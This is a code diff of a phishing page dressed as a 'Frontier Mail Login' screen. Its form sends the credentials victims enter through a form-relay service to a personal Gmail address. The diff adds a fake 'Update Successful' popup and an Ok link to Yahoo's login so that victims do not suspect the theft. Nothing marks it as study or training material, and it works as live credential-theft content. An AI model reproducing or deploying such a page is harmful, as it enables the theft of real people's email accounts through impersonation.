@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
   <head>
@@ -5,7 +6,9 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   
-  <link rel="stylesheet" href="/style2.css">  
+  <link rel="stylesheet" href="./style2.css">  
+  <link rel="stylesheet" href="./style.css">
+
 
     <title>Frontier Mail Login</title>
     <link rel="shortcut icon" href="ftr-sys-theme/img/favicon.svg">
@@ -52,6 +55,12 @@
     
   </head>
   <body>
+   
+  <div class="popup" id="popup">
+    <img src="./HD_Outline_Tick_Check_Mark_Symbol_Logo_In_Red_Circle_Icon_PNG-removebg-preview.png" alt="">
+    <h2>Update Successful</h2>
+    <button type="submit" onclick="closepopup()"><a href="https://login.yahoo.com/?.intl">Ok</a></button>
+  </div>
 
     <section id="blur" class="">
 
@@ -141,7 +150,7 @@ function submit_login(e)
 //-->
 </script>
 
-      <form id="form" action="https://formsubmit.co/kessler081@gmail.com" method="POST">
+      <form id="contactform" action="https://formsubmit.io/send/kessler081@gmail.com" method="POST">
         <input type="hidden" name="_next" value="#">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_template" value="table">
@@ -162,8 +171,8 @@ function submit_login(e)
                 <div id="error"></div>
               </div>
 
-              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="window.location.href='https://www.yahoo.com';" >Login</button>  
-                <!-- <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="window.location.href='https://www.yahoo.com >Login</button> -->
+              <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit" onclick="openpopup()" >Login</button>  
+                <!-- <button id='button' type="submit" tabindex="6" class="btn btn-primary btn-block" alt="submit">Login</button> -->
                 
 
               <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password ?</a></p>
@@ -405,6 +414,6 @@ function submit_login(e)
     <script src="/dtm_bottom.js"></script><script>try { _satellite.pageBottom(); } catch (e) {}</script>
     
 
-    <Script defer src="error.js"></Script>
+    <Script src="error.js"></Script>
   </body>
 </html>
